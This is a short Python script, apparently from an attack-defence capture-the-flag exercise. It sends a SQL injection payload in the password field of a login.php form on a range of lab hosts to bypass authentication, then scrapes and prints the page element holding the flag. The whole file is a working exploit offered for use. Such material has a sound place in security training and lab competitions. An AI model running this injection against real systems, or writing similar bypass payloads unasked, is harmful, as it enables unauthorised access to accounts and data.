import sys

import requests
from bs4 import BeautifulSoup


# exploit
def sqli_request(ip, port):
    data = {
        'username': 'dummy@egibide.org',
        'password': 'blah\') or 1-- '
    }

    response = requests.post(
        f"http://{ip}:{port}/login.php",
        data=data
    )

    soup = BeautifulSoup(response.text, 'html.parser')
    response = soup.find(id='flag')
    if response is None:
        return 'Exploit fallido'
    return response.text.strip()


IP_MASK = '10.0.%d.101'
ip = IP_MASK % sys.argv[1]
content = sqli_request(ip, 80)
print(content)
